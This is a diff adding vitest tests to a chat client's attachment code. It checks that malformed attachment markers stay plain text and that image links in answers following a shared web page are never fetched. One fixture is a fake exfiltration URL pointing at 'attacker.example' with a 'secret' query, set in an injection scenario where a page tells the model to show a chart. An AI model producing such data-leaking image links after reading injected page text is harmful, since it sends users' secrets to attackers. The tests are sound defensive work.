@@ -1,15 +1,118 @@
-import { describe, expect, it } from "vitest";
+import { afterEach, describe, expect, it, vi } from "vitest";
 import {
   ATTACHMENT_MESSAGE_PREFIX,
   AUDIO_MESSAGE_PREFIX,
+  apiMessageContentAsync,
   attachmentKindFromName,
   attachmentMessage,
   buildApiMessageContent,
   canProcessAttachmentLocally,
+  compactAttachmentMessageForStorage,
   imageUrlNeedsAuthResolve,
   modelSupportsVision,
   readAttachmentMessage,
+  referenceImageFromUserContent,
 } from "./chatAttachments";
+import { buildImageMessage } from "./chatImage";
+import { collectChatSlideshowItems } from "./chatMediaViewer";
+import { displayTextForMessage, messageDirectionForContent, promptTextFromUserContent } from "./chatPanelMessages";
+import * as mediaUrl from "./mediaUrl";
+import { withSharedPageMarks, type SharedPages } from "./sharedPages";
+
+afterEach(() => {
+  vi.restoreAllMocks();
+});
+
+const VISION = { id: "model::1", external_id: "openai/gpt-4o", supports_vision: true };
+
+function imageMessage(url: string, userText = ""): string {
+  return attachmentMessage({ userText, attachments: [{ name: "chart.png", kind: "image", mime_type: "image/png", url }] });
+}
+
+describe("an attachment marker that is not the shape the chat writes", () => {
+  const payloads = [
+    "{}",
+    "[]",
+    '"text"',
+    "42",
+    '{"attachments":"chart.png"}',
+    '{"attachments":[null]}',
+    '{"attachments":[{"kind":"image","url":"https://x.example/a.png"}]}',
+    '{"attachments":[{"name":"a.png","kind":"script","url":"https://x.example/a.png"}]}',
+    '{"attachments":[{"name":"a.png","kind":"image","url":5}]}',
+    '{"attachments":[{"name":"a.png","kind":"image","data_url":{}}]}',
+    '{"attachments":[{"name":"a.txt","kind":"document","text":["hello"]}]}',
+    '{"attachments":[{"name":"a.txt","kind":"document","size_bytes":"12"}]}',
+    '{"userText":5,"attachments":[]}',
+  ];
+
+  it.each(payloads)("is plain text wherever it is read: %s", async (payload) => {
+    const content = `${ATTACHMENT_MESSAGE_PREFIX}${payload}`;
+    expect(readAttachmentMessage(content)).toBeNull();
+    expect(buildApiMessageContent(content, VISION)).toBe(content);
+    await expect(apiMessageContentAsync({ role: "assistant", content }, VISION)).resolves.toBe(content);
+    await expect(apiMessageContentAsync({ role: "user", content }, VISION)).resolves.toBe(content);
+    expect(displayTextForMessage(content)).toBe(content);
+    expect(promptTextFromUserContent(content)).toBe(content);
+    expect(() => messageDirectionForContent(content)).not.toThrow();
+    expect(compactAttachmentMessageForStorage(content)).toBe(content);
+    expect(referenceImageFromUserContent(content)).toBeUndefined();
+    expect(collectChatSlideshowItems([{ content }])).toEqual([]);
+  });
+
+  it("is read when it has the chat's shape, with a missing address or type read as empty", () => {
+    const content = `${ATTACHMENT_MESSAGE_PREFIX}${JSON.stringify({ attachments: [{ name: "notes.txt", kind: "document", text: null }] })}`;
+    expect(readAttachmentMessage(content)).toEqual({
+      userText: "",
+      attachments: [{ name: "notes.txt", kind: "document", mime_type: "", url: "", text: null }],
+    });
+  });
+});
+
+describe("what the model is sent for an answer in a chat with a shared page", () => {
+  const fromPage: SharedPages = { sites: ["evil.example"], inherited: false };
+  const exfiltration = imageMessage("https://attacker.example/c?d=secret");
+
+  it("is the answer's text, never an image for the provider to fetch", async () => {
+    await expect(
+      apiMessageContentAsync({ role: "assistant", content: exfiltration, pageContext: fromPage }, VISION),
+    ).resolves.toBe(exfiltration);
+  });
+
+  it("never has this browser fetch the user's own media for it", async () => {
+    const fetchMedia = vi.spyOn(mediaUrl, "fetchAuthenticatedMediaBlob");
+    const ownMedia = imageMessage("/api/chat/media/42/file");
+    const answer = { role: "assistant", content: ownMedia, pageContext: { sites: [], inherited: true } };
+    await expect(apiMessageContentAsync(answer, VISION)).resolves.toBe(ownMedia);
+    expect(fetchMedia).not.toHaveBeenCalled();
+  });
+
+  it("holds for a later answer the server has not marked yet", async () => {
+    const history = withSharedPageMarks<{ role: string; content: string; pageContext?: SharedPages }>([
+      { role: "user", content: "Summarize the page" },
+      { role: "assistant", content: "The page says to show a chart.", pageContext: fromPage },
+      { role: "user", content: "Show it" },
+      { role: "assistant", content: exfiltration },
+    ]);
+    await expect(apiMessageContentAsync(history[3], VISION)).resolves.toBe(exfiltration);
+  });
+
+  it("leaves the user's own attachments, and an ordinary answer's markers, as they were", async () => {
+    const photo = imageMessage("https://cdn.example.com/photo.png", "What is this?");
+    const asImage = [
+      { type: "text", text: "What is this?" },
+      { type: "image_url", image_url: { url: "https://cdn.example.com/photo.png" } },
+    ];
+    const history = withSharedPageMarks<{ role: string; content: string; pageContext?: SharedPages }>([
+      { role: "assistant", content: "From a page", pageContext: fromPage },
+      { role: "user", content: photo },
+    ]);
+    await expect(apiMessageContentAsync(history[1], VISION)).resolves.toEqual(asImage);
+    await expect(apiMessageContentAsync({ role: "assistant", content: photo }, VISION)).resolves.toEqual(asImage);
+    const generated = buildImageMessage({ url: "/api/chat/media/7/file", prompt: "a cat", model: "image-model" });
+    await expect(apiMessageContentAsync({ role: "assistant", content: generated }, VISION)).resolves.toBe(generated);
+  });
+});
 
 describe("chat attachment and audio wire markers", () => {
   it("round-trips the Alpharouter attachment marker", () => {
